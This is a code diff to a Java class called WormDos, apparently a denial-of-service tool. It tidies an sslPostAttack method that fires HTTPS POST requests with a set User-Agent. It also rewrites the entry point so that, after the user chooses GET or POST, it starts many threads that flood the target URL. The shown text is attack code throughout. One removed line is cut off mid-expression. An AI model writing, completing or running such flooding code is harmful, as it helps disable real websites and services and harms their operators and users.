@@ -141,7 +141,7 @@ public class WormDos implements Runnable {
     }
 
     private void sslPostAttack(String url) throws Exception {
-                URL obj = new URL(url);
+        URL obj = new URL(url);
         HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
         con.setRequestMethod("POST");
         con.setRequestProperty("User-Agent", USER_AGENT);
@@ -195,4 +195,18 @@ public class WormDos implements Runnable {
 
         System.out.print("method: ");
         String option = in.nextLine();
-        int ioption = "get".equalsIgnoreCase(option) ? ("http".equals(SUrl[0]) ? 3 : 4) : ("http".equals(SUrl[
+        int ioption;
+        if ("get".equalsIgnoreCase(option)) {
+            ioption = "http".equals(SUrl[0]) ? 3 : 4;
+        } else {
+            ioption = "http".equals(SUrl[0]) ? 1 : 2;
+        }
+
+        for (int i = 0; i < WormDos.amount; i++) {
+            Thread t = new Thread(new WormDos(i, ioption));
+            t.start();
+        }
+
+        in.close();
+    }
+}
